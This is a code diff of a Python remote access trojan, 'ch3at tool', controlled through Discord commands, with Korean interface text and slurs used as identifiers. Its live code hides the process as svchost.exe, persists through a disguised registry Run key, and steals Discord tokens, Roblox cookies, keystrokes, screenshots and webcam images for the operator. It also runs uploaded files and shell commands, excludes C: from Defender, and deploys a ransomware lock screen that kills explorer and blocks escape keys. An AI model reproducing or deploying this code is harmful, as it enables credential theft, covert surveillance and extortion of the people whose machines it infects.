@@ -1,26 +1,14 @@
-import ssl
-import os
-import sys
-import asyncio
-import aiohttp
-ssl._create_default_https_context = ssl._create_unverified_context
-os.environ['PYTHONHTTPSVERIFY'] = '0'
-os.environ['SSL_CERT_FILE'] = ''
-os.environ['REQUESTS_CA_BUNDLE'] = ''
-try:
-    import urllib3
-    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-except:
-    pass
-ssl.create_default_context = ssl._create_unverified_context
 import winreg
+import os
 import re
+import sys
 import json
 import time
 import random
 import base64
 import ctypes
 import logging
+import asyncio
 import zipfile
 import threading
 import platform
@@ -40,9 +28,12 @@ from PIL import Image, ImageTk
 import discord
 from discord.ext import commands
 from discord import utils
+
 from comtypes import CLSCTX_ALL
 import comtypes
+
 from io import BytesIO
+
 import win32gui
 from win32 import win32gui
 import win32con
@@ -51,29 +42,30 @@ import win32process
 import win32net
 import win32com.client as wincl
 from win32crypt import CryptUnprotectData
+
 import pyautogui
 import browserhistory as bh
+
 from mss import mss
 from pynput.keyboard import Key, Listener
-try:
-    import cv2
-    import numpy as np
-    CV2_AVAILABLE = True
-except ImportError:
-    CV2_AVAILABLE = False
+
 token = ''
 global appdata
 appdata = os.getenv('APPDATA')
 intents = discord.Intents.default()
 intents.message_content = True
+
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
+
 BRAND_IMAGE = "https://i.ibb.co/4w12CZhp/yea.png"
+
 def ch3at_embed(text, color=0x00aaff, thumbnail=True):
     embed = discord.Embed(title="ch3at tool • 터미널", description=text, color=color)
     if thumbnail:
         embed.set_thumbnail(url=BRAND_IMAGE)
     embed.set_footer(text="ch3at tool", icon_url=BRAND_IMAGE)
     return embed
+
 def hide_script():
     import ctypes
     from ctypes import wintypes, byref
@@ -89,6 +81,7 @@ def hide_script():
             ('UniqueProcessId', ctypes.c_void_p),
             ('InheritedFromUniqueProcessId', ctypes.c_void_p),
         ]
+
     pbi = PROCESS_BASIC_INFORMATION()
     status = ntdll.NtQueryInformationProcess(
         current, 0, byref(pbi), ctypes.sizeof(pbi), None
@@ -97,6 +90,7 @@ def hide_script():
         return False
     is_64bit = ctypes.sizeof(ctypes.c_void_p) == 8
     peb_offset = 0x20 if is_64bit else 0x10
+
     buffer = ctypes.create_string_buffer(8)
     bytes_read = wintypes.SIZE_T()
     kernel32.ReadProcessMemory(
@@ -106,6 +100,7 @@ def hide_script():
         8,
         byref(bytes_read)
     )
+
     proc_params = ctypes.c_void_p()
     ctypes.memmove(byref(proc_params), buffer, ctypes.sizeof(proc_params))
     str_offset = 0x60 if is_64bit else 0x38
@@ -117,8 +112,10 @@ def hide_script():
         16,
         byref(bytes_read)
     )
+
     buf_ptr = ctypes.c_void_p()
     ctypes.memmove(byref(buf_ptr), str_buffer[4:4+ctypes.sizeof(ctypes.c_void_p)], ctypes.sizeof(ctypes.c_void_p))
+
     target = "svchost.exe\0"
     target_bytes = target.encode('utf-16-le')
     kernel32.WriteProcessMemory(
@@ -129,7 +126,9 @@ def hide_script():
         byref(wintypes.SIZE_T())
     )
     return True
+
 hide_script()
+
 def hide_and_persist():
     try:
         path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
@@ -139,7 +138,9 @@ def hide_and_persist():
         winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, f'"{path}"')
         winreg.CloseKey(key)
     except Exception: pass
+
 hide_and_persist()
+
 async def activity(client):
     while True:
         global stop_threads
@@ -149,11 +150,13 @@ async def activity(client):
         game = discord.Game(f"방문 중: {window}")
         await client.change_presence(status=discord.Status.online, activity=game)
         time.sleep(1)
+
 def between_callback(client):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     loop.run_until_complete(activity(client))
     loop.close()
+
 def fetch_roblox_sex(cookie):
     headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
     try:
@@ -164,10 +167,13 @@ def fetch_roblox_sex(cookie):
         user_id = user_data["id"]
         username = user_data["name"]
         display_name = user_data.get("displayName", "N/A")
+
         robux_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers, timeout=10)
         robux = robux_res.json().get("robux", 0) if robux_res.status_code == 200 else 0
+
         prem_res = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers=headers, timeout=10)
         is_premium = prem_res.json() if prem_res.status_code == 200 else False
+
         thumb_res = requests.get(
             f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png",
             headers=headers, timeout=10
@@ -188,6 +194,7 @@ def fetch_roblox_sex(cookie):
         }
     except Exception:
         return None
+
 def get_roblox_sex():
     user_profile = os.getenv("USERPROFILE", "")
     roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
@@ -234,6 +241,9 @@ def get_roblox_sex():
     if not info:
         return None, "토큰이 유효하지 않거나 Roblox API가 오류를 반환했습니다."
     return info, token
+
+
+
 class DiscordMod:
     def __init__(self):
         self.app = os.getenv('APPDATA')
@@ -241,8 +251,10 @@ class DiscordMod:
         self.tmp = os.getenv('TEMP')
         self.tokens = []
         self.totals = {"disc": 0}
+
     def _log(self, msg):
         print(f"[+] {msg}")
+
     def disc_tget(self):
         try:
             self._log("Discord 토큰 추출 중...")
@@ -251,6 +263,7 @@ class DiscordMod:
                 from win32crypt import CryptUnprotectData
             except:
                 return
+
             _tks = []
             _ps = {
                 "Discord": self.app + "\\Discord",
@@ -261,6 +274,7 @@ class DiscordMod:
                 "Brave": self.loc + "\\BraveSoftware\\Brave-Browser\\User Data",
                 "Edge": self.loc + "\\Microsoft\\Edge\\User Data"
             }
+
             for n, p in _ps.items():
                 niggers = ["discord", "canary", "ptb", "lightcord"]
                 _bases = [p] if any(name.lower() in n.lower() for name in niggers) else [
@@ -275,6 +289,7 @@ class DiscordMod:
                             _mk = CryptUnprotectData(base64.b64decode(_k)[5:], None, None, None, 0)[1]
                     except:
                         pass
+
                 for b in _bases:
                     _ld = os.path.join(b, "Local Storage", "leveldb")
                     if not os.path.exists(_ld):
@@ -299,6 +314,7 @@ class DiscordMod:
                                                 pass
                             except:
                                 pass
+
             _res = ""
             for t in _tks:
                 h = {
@@ -343,6 +359,7 @@ class DiscordMod:
                             self.totals["disc"] += 1
                 except:
                     pass
+
             if _res:
                 out_path = os.path.join(self.tmp, "discord_tokens.txt")
                 with open(out_path, "w", encoding="utf-8") as f:
@@ -350,11 +367,13 @@ class DiscordMod:
             self._log(f"Discord 토큰 발견: {len(self.tokens)}")
         except Exception as e:
             self._log(f"Discord 토큰 오류: {e}")
+
 bot_loop = None
 bot_ready = False
 _pending = []
 _pending_lock = threading.Lock()
-log_channel_id = 0
+log_channel_id = 0 
+
 @bot.event
 async def on_ready():
     global bot_loop, bot_ready
@@ -370,7 +389,7 @@ async def on_ready():
                 num = int(x.name.split("-")[1])
                 existing_sessions.append(num)
             except (ValueError, IndexError):
-                pass
+                pass    
     if existing_sessions:
         number = max(existing_sessions) + 1
     else:
@@ -423,6 +442,9 @@ async def on_ready():
     await channel.send(content="@here", embed=embed)
     game = discord.Game("창 로깅 중지됨")
     await bot.change_presence(status=discord.Status.online, activity=game)
+
+
+
 log_channel_id = 0
 RANSOM_PW = "N4vi_0n_T0p"
 IMAGE_URL = "https://i.ibb.co/KpxXhQhm/image.png"
@@ -436,6 +458,7 @@ WH_KEYBOARD_LL = 13
 WM_KEYDOWN = 0x0100
 VK_LWIN = 0x5B
 VK_RWIN = 0x5C
+
 @bot.command(name="ransomware")
 async def set_log_channel(ctx):
     global log_channel_id
@@ -443,6 +466,7 @@ async def set_log_channel(ctx):
     await ctx.send("**설정 준비 중...**")
     time.sleep(1)
     await ctx.send(f"**완료! 랜섬웨어를 배포하려면 !lock을 입력하세요..**\n잠금 해제 비밀번호: `{RANSOM_PW}`")
+
 async def _background_sender():
     global log_channel_id
     await bot.wait_until_ready()
@@ -464,18 +488,22 @@ async def _background_sender():
         except Exception as e:
             print(f"[BOT] 백그라운드 오류: {e}")
         await asyncio.sleep(0.5)
+
 def send_discord_message(content):
     with _pending_lock:
         _pending.append(content)
+
 if ctypes.sizeof(ctypes.c_void_p) == 8:
     WPARAM = ctypes.c_uint64
     LPARAM = ctypes.c_int64
 else:
     WPARAM = ctypes.c_uint32
     LPARAM = ctypes.c_int32
+
 LowLevelKeyboardProc = ctypes.WINFUNCTYPE(
     ctypes.c_long, ctypes.c_int, WPARAM, LPARAM
 )
+
 class KBDLLHOOKSTRUCT(ctypes.Structure):
     _fields_ = [
         ("vkCode", ctypes.wintypes.DWORD),
@@ -484,14 +512,17 @@ class KBDLLHOOKSTRUCT(ctypes.Structure):
         ("time", ctypes.wintypes.DWORD),
         ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
     ]
+
 _hook_proc_callback = None
 hook_handle = None
+
 def _hook_proc(nCode, wParam, lParam):
     if nCode >= 0 and wParam == WM_KEYDOWN:
         kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
         if kb.vkCode in (VK_LWIN, VK_RWIN):
             return 1
     return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
+
 def install_keyblock():
     global hook_handle, _hook_proc_callback
     if hook_handle:
@@ -507,14 +538,17 @@ def install_keyblock():
     hook_handle = user32.SetWindowsHookExW(WH_KEYBOARD_LL, callback_ptr, 0, 0)
     if not hook_handle:
         print("[!] 키보드 후크 설치 실패.")
+
 def uninstall_keyblock():
     global hook_handle
     if hook_handle:
         ctypes.windll.user32.UnhookWindowsHookEx(hook_handle)
         hook_handle = None
+
 def kill_process(procname):
     subprocess.run(["taskkill", "/f", "/im", procname],
                    capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+
 def poll_killer():
     while not _killer_stop.is_set():
         try:
@@ -523,6 +557,7 @@ def poll_killer():
         except Exception:
             pass
         _killer_stop.wait(0.5)
+
 def disable_taskmgr_registry():
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
@@ -532,6 +567,7 @@ def disable_taskmgr_registry():
         winreg.CloseKey(key)
     except Exception:
         pass
+
 def cleanup_lockdown():
     _killer_stop.set()
     uninstall_keyblock()
@@ -545,24 +581,31 @@ def cleanup_lockdown():
         pass
     time.sleep(0.3)
     subprocess.Popen("explorer.exe", creationflags=subprocess.CREATE_NO_WINDOW)
+
 class LockscreenGUI:
     def __init__(self, root, image_url=IMAGE_URL):
         self.root = root
         self.wrong_attempts = 0
         self.root.attributes("-fullscreen", True, "-topmost", True)
         self.root.overrideredirect(True)
+
         install_keyblock()
         disable_taskmgr_registry()
+
         _killer_stop.clear()
         killer = threading.Thread(target=poll_killer, daemon=True)
         killer.start()
+
         kill_process("explorer.exe")
+
         self.root.bind("<Alt-F4>", self._block)
         self.root.bind("<Escape>", self._block)
         self.root.bind("<F11>", self._block)
         self.root.bind("<Alt-space>", self._block)
+
         self.root.lift()
         self.root.focus_force()
+
         try:
             resp = requests.get(image_url, timeout=10)
             resp.raise_for_status()
@@ -573,11 +616,14 @@ class LockscreenGUI:
             img = Image.alpha_composite(bg, raw).convert("RGB")
         except Exception:
             img = Image.new("RGB", (root.winfo_screenwidth(), root.winfo_screenheight()), (10, 10, 10))
+
         img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
         self.bg_tk = ImageTk.PhotoImage(img)
+
         canvas = tk.Canvas(root, highlightthickness=0, bg="black")
         canvas.pack(fill="both", expand=True)
         canvas.create_image(0, 0, image=self.bg_tk, anchor="nw")
+
         self.entry = tk.Entry(root, font=("Courier", 20), show="*", justify="center",
                               bg="black", fg="#00ff00", insertbackground="#00ff00",
                               insertwidth=2, relief="flat")
@@ -586,9 +632,12 @@ class LockscreenGUI:
                              window=self.entry, width=350)
         self.root.bind("<Return>", self.check_pw)
         self.entry.focus_set()
+
         send_discord_message(":lock: **랜섬웨어 활성화됨**")
+
     def _block(self, event):
         return "break"
+
     def check_pw(self, e=None):
         global locker_window
         pw_entered = self.entry.get()
@@ -605,17 +654,20 @@ class LockscreenGUI:
                 f":no_entry: **비밀번호 오류 시도 #{self.wrong_attempts}**: `{pw_entered}`"
             )
             self.entry.delete(0, tk.END)
+
 def run_gui():
     global locker_window
     if not locker_window:
         locker_window = tk.Tk()
         app = LockscreenGUI(locker_window)
         locker_window.mainloop()
+
 @bot.command()
 async def lock(ctx, target="all"):
     if target.lower() in ["all", HOSTNAME.lower()]:
         await ctx.send(f"🔒 `{HOSTNAME}`에 랜섬웨어 배포 중...")
         threading.Thread(target=run_gui, daemon=True).start()
+
 @bot.command()
 async def unlock(ctx, target="all"):
     global locker_window
@@ -629,14 +681,18 @@ async def unlock(ctx, target="all"):
                 await ctx.send(f"⚠️ **[오류]** `{HOSTNAME}` 잠금 해제 실패: {str(e)}")
         else:
             await ctx.send(f"ℹ️ `{HOSTNAME}`은(는) 현재 잠금 상태가 아닙니다.")
+
 def volumeup():
     os.system("powershell -c (New-Object -ComObject WScript.Shell).SendKeys([char]175)")
+
 def volumedown():
     os.system("powershell -c (New-Object -ComObject WScript.Shell).SendKeys([char]174)")
+
 thumb = BRAND_IMAGE
 def get_embed(page: str):
     e = discord.Embed(title="ch3at tool • 명령어", color=0x00aaff)
     e.set_thumbnail(url=thumb)
+
     if page == "main":
         e.description = (
             "📡 **모든 명령어 및 정보**\n\n"
@@ -644,6 +700,7 @@ def get_embed(page: str):
             "🔑 = 관리자 권한 필요\n"
             "⚠️ = 안티바이러스 경고 가능"
         )
+
     if page == "system":
         e.description = (
             "📡 **시스템 명령어**\n\n"
@@ -654,6 +711,7 @@ def get_embed(page: str):
             "`!getadmin` – 관리자 권한 요청 (UAC)\n"
             "`!disabledefender` – Defender에서 C:\\ 제외 🔑"
         )
+
     elif page == "files":
         e.description = (
             "📂 **파일 관리**\n\n"
@@ -661,6 +719,7 @@ def get_embed(page: str):
             "`!download <파일>` – 타겟에서 파일 다운로드\n"
             "`!upload <파일>` – 타겟에 파일 업로드"
         )
+
     elif page == "exec":
         e.description = (
             "⚡ **실행**\n\n"
@@ -671,6 +730,7 @@ def get_embed(page: str):
             "`!sing <URL>` – YouTube 숨김 재생\n"
             "`!stopsing` – 재생 중지"
         )
+
     elif page == "surveillance":
         e.description = (
             "👁️ **감시**\n\n"
@@ -683,6 +743,7 @@ def get_embed(page: str):
             "`!discord` – Discord 토큰 탈취\n"
             "`!roblox` – Roblox 쿠키 탈취"
         )
+
     elif page == "keylogger":
         e.description = (
             "⌨️ **키로거**\n\n"
@@ -690,6 +751,7 @@ def get_embed(page: str):
             "`!stopkeylogger` – 중지\n"
             "`!dumpkeylogger` – 로그 덤프"
         )
+
     elif page == "trolling":
         e.description = (
             "🎭 **트롤링**\n\n"
@@ -698,8 +760,8 @@ def get_embed(page: str):
             "`!jumpscare` - 전체화면 공포 + 큰 소리\n"
             "`!wallpaper` - 배경화면 변경 (이미지 첨부)\n"
             "`!flipscreen / !reset` - 화면 뒤집기 트릭\n"
-            "`!crazymouse <초> [반경] [속도]` - 랜덤 마우스 움직임 (반경 기본 200px, 속도 기본 20회/초)\n"
-            "`!earthquake <초> [진폭] [간격]` - 창 흔들기 (진폭 기본 15px, 간격 기본 0.04초)\n"
+            "`!crazymouse <초>` - 랜덤 마우스 움직임\n"
+            "`!earthquake <초>` - 모든 창 흔들기\n"
             "`!spamtts <횟수> <텍스트>` - TTS 음성 스팸\n"
             "`!beep <횟수>` – 시스템 비프 스팸\n"
             "`!rickroll` - 클래식 릭롤\n"
@@ -711,6 +773,7 @@ def get_embed(page: str):
             "`!disabletaskmgr / !enabletaskmgr` – 작업 관리자 🔑\n"
             "`!spam_site <URL>` - 웹사이트 100개 탭 스팸"
         )
+
     elif page == "destructive":
         e.description = (
             "☠️ **파괴**\n\n"
@@ -722,27 +785,17 @@ def get_embed(page: str):
             "`!uncritproc` – 중요 해제 🔑\n"
             "`!bsod` – 블루스크린 🔑"
         )
+
     elif page == "session":
         e.description = (
             "🔧 **세션**\n\n"
             "`!exit`\n"
             "`!kill <세션/all>`"
         )
-    elif page == "mouse":
-        e.description = (
-            "🖱️ **마우스 & 키보드 & 스트리밍**\n\n"
-            "`!site <url>` – 기본 브라우저로 사이트 열기\n"
-            "`!mouseposition` – 현재 마우스 좌표\n"
-            "`!mousemove <x> <y>` – 마우스 이동\n"
-            "`!mouseclick <x> <y> [left|right|middle]` – 클릭 (기본 left)\n"
-            "`!mousedrag <x1> <y1> <x2> <y2> [button]` – 드래그\n"
-            "`!keypress <key>` – 키 누르기 (예: enter, a, ctrl)\n"
-            "`!stream` – 화면 실시간 스트리밍 시작 (3초 간격, 최대 20장)\n"
-            "`!stopstream` – 스트리밍 중지\n"
-            "`!recordvideo <초>` – MP4 영상 녹화 (OpenCV 필요, 없으면 ZIP 폴백)"
-        )
+
     e.set_footer(text="ch3at tool")
     return e
+
 class HelpSelect(discord.ui.Select):
     def __init__(self):
         options = [
@@ -754,33 +807,41 @@ class HelpSelect(discord.ui.Select):
             discord.SelectOption(label="🎭 트롤링", value="trolling"),
             discord.SelectOption(label="☠️ 파괴", value="destructive"),
             discord.SelectOption(label="🔧 세션", value="session"),
-            discord.SelectOption(label="🖱️ 마우스", value="mouse"),
         ]
+
         super().__init__(
             placeholder="선택...",
             options=options,
             min_values=1,
             max_values=1
         )
+
     async def callback(self, interaction: discord.Interaction):
         page = self.values[0]
         await interaction.response.edit_message(
             embed=get_embed(page),
             view=self.view
         )
+
+
 class HelpView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=300)
         self.add_item(HelpSelect())
+
+
 @bot.command()
 async def help(ctx):
     await ctx.send(embed=get_embed("main"), view=HelpView())
+
 @bot.command(brief="피해자 브라우저에서 웹사이트를 스팸으로 엽니다.")
 async def spam_site(ctx, url: str, amount: int = 100):
     try:
         if not url.startswith(("http://", "https://")):
             url = "https://" + url
+
         await ctx.send(f"{url}을(를) {amount}번 브라우저로 스팸 중...")
+
         def do_spam():
             for _ in range(amount):
                 try:
@@ -792,9 +853,13 @@ async def spam_site(ctx, url: str, amount: int = 100):
                     time.sleep(0.05)
                 except:
                     pass
+
         threading.Thread(target=do_spam, daemon=True).start()
+
     except Exception as e:
         await ctx.send(f"사이트 스팸 오류: {str(e)}")
+
+
 EXEC_MAP = {
     ".py":   (sys.executable,       False, None),
     ".bat":  (["cmd.exe", "/c"],     True,  None),
@@ -808,10 +873,12 @@ EXEC_MAP = {
     ".msi":  (["msiexec.exe", "/i"], True, "msiexec.exe"),
 }
 DEFAULT_EXEC = (None, True, None)
+
 def run_with_fallback(cmd, use_shell, cwd, hide_window=True):
     flags = 0
     if hide_window and sys.platform == "win32" and hasattr(subprocess, 'CREATE_NO_WINDOW'):
         flags = subprocess.CREATE_NO_WINDOW
+
     proc = subprocess.Popen(
         cmd,
         shell=use_shell,
@@ -821,8 +888,10 @@ def run_with_fallback(cmd, use_shell, cwd, hide_window=True):
         stderr=subprocess.DEVNULL,
         creationflags=flags
     )
+
     time.sleep(0.5)
     ret = proc.poll()
+
     if ret is not None and hide_window:
         if ret == 0:
             return proc, None
@@ -842,7 +911,9 @@ def run_with_fallback(cmd, use_shell, cwd, hide_window=True):
             return proc, None
         else:
             return proc, f"프로세스가 코드 {ret}로 종료됨"
+
     return proc, None
+
 @bot.command(name="execut")
 async def upload_and_run(ctx: commands.Context):
     if not ctx.message.attachments:
@@ -862,6 +933,7 @@ async def upload_and_run(ctx: commands.Context):
         except FileNotFoundError:
             await ctx.send(f"ch3at tool이 **{ext}**을(를) 실행할 수 없습니다 — `{check_bin}`이(가) PATH에 없습니다.")
             return
+
     temp_dir = tempfile.gettempdir()
     file_path = os.path.join(temp_dir, filename)
     try:
@@ -879,10 +951,12 @@ async def upload_and_run(ctx: commands.Context):
         else:
             cmd = [interpreter_cmd, file_path]
     proc, error = run_with_fallback(cmd, use_shell, temp_dir)
+
     if error:
         await ctx.send(f"ch3at tool이 **{filename}**을(를) 실행했지만 프로세스가 종료됨: {error}")
     else:
         await ctx.send(f"ch3at tool이 **{filename}**을(를) **{temp_dir}**에서 실행함 (PID: {proc.pid})")
+
 @bot.command(name="roblox")
 async def roblox(ctx):
     await ctx.send("ch3at tool이 피해자 PC에서 쿠키를 검색 중...")
@@ -909,8 +983,11 @@ async def roblox(ctx):
             embed.add_field(name=f"토큰 파트 {idx+1}/{len(chunks)}", value=f"```\n{chunk}\n```", inline=False)
     else:
         embed.add_field(name="토큰", value=f"```\n{token}\n```", inline=False)
+
     embed.set_footer(text="ch3at tool")
+
     await ctx.send(embed=embed)
+
 @bot.command(name="discord")
 async def grab_tokens(ctx):
     await ctx.send("ch3at tool이 피해자 PC에서 토큰을 검색 중...")
@@ -953,33 +1030,9 @@ async def grab_tokens(ctx):
         embeds_to_send.append(embed)
     await ctx.send(embeds=embeds_to_send)
     await ctx.send(f"ch3at tool이 피해자 PC에서 **{len(embeds_to_send)}**개의 토큰을 찾았습니다.")
-streaming_active = False
-streaming_thread = None
-streaming_stop_event = threading.Event()
-def stream_screenshots(channel):
-    global streaming_active
-    count = 0
-    max_frames = 20
-    interval = 3
-    with mss() as sct:
-        while not streaming_stop_event.is_set() and count < max_frames:
-            try:
-                temp = os.getenv('TEMP')
-                path = os.path.join(temp, f"stream_{int(time.time())}.png")
-                sct.shot(output=path)
-                asyncio.run_coroutine_threadsafe(
-                    channel.send(file=discord.File(path)),
-                    bot_loop
-                )
-                count += 1
-                time.sleep(interval)
-            except Exception as e:
-                send_discord_message(f"❌ 스트림 오류: {str(e)}")
-                break
-    streaming_active = False
+
 @bot.event
 async def on_message(message):
-    global streaming_active, streaming_thread, streaming_stop_event
     if message.content.startswith("!kill"):
         if message.content[6:] == "all":
             for y in range(len(on_ready.total)):
@@ -993,14 +1046,17 @@ async def on_message(message):
                 await message.channel.send(embed=ch3at_embed(f"세션 `{message.content[6:]}` 종료됨.", color=0xff0000))
             except:
                 await message.channel.send(embed=ch3at_embed(f"세션 `{message.content[6:]}`이(가) 유효하지 않습니다. 올바른 세션 이름을 입력하세요.", color=0xff0000))
+
     if message.content == "!dumpkeylogger":
         temp = os.getenv("TEMP")
         file_keys = os.path.join(os.getenv('TEMP') + "\\key_log.txt")
         file = discord.File(file_keys, filename=file_keys)
         await message.channel.send(embed=ch3at_embed("📋 **키로거 덤프:** 로그가 성공적으로 검색되었습니다."), file=file)
         os.remove(os.path.join(os.getenv('TEMP') + "\\key_log.txt"))
+
     if message.content == "!exit":
         exit()
+
     if message.content == "!windowstart":
         global stop_threads
         stop_threads = False
@@ -1008,23 +1064,28 @@ async def on_message(message):
         _thread = threading.Thread(target=between_callback, args=(bot,))
         _thread.start()
         await message.channel.send(embed=ch3at_embed("이 세션의 창 로깅이 시작되었습니다."))
+
     if message.content == "!windowstop":
         stop_threads = True
         await message.channel.send(embed=ch3at_embed("이 세션의 창 로깅이 중지되었습니다."))
         game = discord.Game(f"창 로깅 중지됨")
         await bot.change_presence(status=discord.Status.online, activity=game)
+
     if message.content == "!screenshot":
         with mss() as sct:
             sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
         file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
         await message.channel.send(embed=ch3at_embed("📸 **스크린샷:** 캡처 완료."), file=file)
         os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))
+
     if message.content == "!volumemax":
         volumeup()
         await message.channel.send(embed=ch3at_embed("🔊 **볼륨:** 100%로 설정."))
+
     if message.content == "!volumezero":
         volumedown()
         await message.channel.send(embed=ch3at_embed("🔇 **볼륨:** 음소거 (0%)."))
+
     if message.content == "!webcampic":
         directory = os.getcwd()
         try:
@@ -1043,6 +1104,7 @@ async def on_message(message):
             os.chdir(directory)
         except:
             await message.channel.send(embed=ch3at_embed("명령어 실패.", color=0xff0000))
+
     if message.content.startswith("!message"):
         MB_YESNO = 0x04
         MB_HELP = 0x4000
@@ -1059,14 +1121,17 @@ async def on_message(message):
         win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
         win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
         win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
+
     if message.content.startswith("!wallpaper"):
         path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
         await message.attachments[0].save(path)
         ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
         await message.channel.send(embed=ch3at_embed("🖼️ **시스템:** 배경화면이 성공적으로 업데이트되었습니다."))
+
     if message.content.startswith("!upload"):
         await message.attachments[0].save(message.content[8:])
         await message.channel.send(embed=ch3at_embed("📤 **파일 전송:** 업로드 성공."))
+
     if message.content.startswith("!shell"):
         global status
         status = None
@@ -1100,17 +1165,21 @@ async def on_message(message):
         else:
             await message.channel.send(embed=ch3at_embed("명령어를 인식하지 못했거나 출력이 없습니다.", color=0xff0000))
             status = None
+
     if message.content.startswith("!download"):
         file = discord.File(message.content[10:], filename=message.content[10:])
         await message.channel.send(embed=ch3at_embed("📥 **파일 전송:** 다운로드 완료."), file=file)
+
     if message.content.startswith("!cd"):
         os.chdir(message.content[4:])
         await message.channel.send(embed=ch3at_embed(f"📂 **디렉토리 업데이트:** 현재 경로: `{os.getcwd()}`"))
+
     if message.content.startswith("!write"):
         if message.content[7:] == "enter":
             pyautogui.press("enter")
         else:
             pyautogui.typewrite(message.content[7:])
+
     if message.content == "!history":
         dict_obj = bh.get_browserhistory()
         strobj = str(dict_obj).encode(errors='ignore')
@@ -1119,6 +1188,7 @@ async def on_message(message):
         file = discord.File("history.txt", filename="history.txt")
         await message.channel.send(embed=ch3at_embed("🌐 **브라우저 기록:** 로그 검색됨."), file=file)
         os.remove("history.txt")
+
     if message.content == "!clipboard":
         CF_TEXT = 1
         kernel32 = ctypes.windll.kernel32
@@ -1137,24 +1207,29 @@ async def on_message(message):
             body = value.decode()
             user32.CloseClipboard()
             await message.channel.send(embed=ch3at_embed(f"**클립보드 내용:**\n```\n{body}\n```"))
+
     if message.content.startswith("!stopsing"):
         os.system(f"taskkill /F /IM {pid_process[1]}")
+
     if message.content == "!sysinfo":
         info = platform.uname()
         info_total = f'{info.system} {info.release} {info.machine}'
         ip = get('https://api.ipify.org').text
         await message.channel.send(embed=ch3at_embed(f"**시스템 정보:**\n`{info_total}`\n**IP:** `{ip}`"))
+
     if message.content == "!geolocate":
         with urllib.request.urlopen("https://geolocation-db.com/json") as url:
             data = json.loads(url.read().decode())
             link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
             await message.channel.send(embed=ch3at_embed(f"**지리적 위치 결과:** [Google Maps]({link})"))
+
     if message.content == "!admincheck":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
             await message.channel.send(embed=ch3at_embed("관리자 권한 확인됨. :gem:", color=0x00ff00))
         else:
             await message.channel.send(embed=ch3at_embed("사용자에게 관리자 권한이 없습니다.", color=0xff0000))
+
     if message.content == "!getadmin":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
@@ -1171,6 +1246,7 @@ async def on_message(message):
                 exit()
             except Exception as e:
                 await message.channel.send(embed=ch3at_embed(f"관리자 권한 요청 실패: `{str(e)}`", color=0xff0000))
+
     if message.content == "!disabledefender":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
@@ -1185,6 +1261,7 @@ async def on_message(message):
                 await message.channel.send(embed=ch3at_embed(f"Defender 제외 실패: `{result.stderr.strip()}`", color=0xff0000))
         else:
             await message.channel.send(embed=ch3at_embed("Defender 제외에는 관리자 권한이 필요합니다.", color=0xff0000))
+
     if message.content.startswith("!sing"):
         volumeup()
         link = message.content[6:]
@@ -1208,6 +1285,7 @@ async def on_message(message):
                 win32gui.EnumWindows(get_all_hwnd, 0)
             except:
                 break
+
     if message.content == "!startkeylogger":
         temp = os.getenv("TEMP")
         logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
@@ -1223,15 +1301,18 @@ async def on_message(message):
         test.daemon = True
         test.start()
         await message.channel.send(embed=ch3at_embed("⌨️ **키로거:** 서비스 시작됨."))
+
     if message.content == "!stopkeylogger":
         test._running = False
         await message.channel.send(embed=ch3at_embed("🛑 **키로거:** 서비스 중지됨."))
+
     if message.content == "!idletime":
         class LASTINPUTINFO(Structure):
             _fields_ = [
                 ('cbSize', c_uint),
                 ('dwTime', c_int),
             ]
+
         def get_idle_duration():
             lastInputInfo = LASTINPUTINFO()
             lastInputInfo.cbSize = sizeof(lastInputInfo)
@@ -1248,12 +1329,14 @@ async def on_message(message):
         duration = get_idle_duration()
         await message.channel.send(embed=ch3at_embed(f"사용자가 `{duration:.2f}`초 동안 유휴 상태였습니다."))
         time.sleep(1)
+
     if message.content.startswith("!voice"):
         volumeup()
         speak = wincl.Dispatch("SAPI.SpVoice")
         speak.Speak(message.content[7:])
         comtypes.CoUninitialize()
         await message.channel.send(embed=ch3at_embed("🗣️ **음성:** 명령어 실행됨."))
+
     if message.content.startswith("!blockinput"):
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
@@ -1261,6 +1344,7 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed("🔒 **시스템:** 사용자 입력 차단됨."))
         else:
             await message.channel.send(embed=ch3at_embed("이 작업에는 관리자 권한이 필요합니다.", color=0xff0000))
+
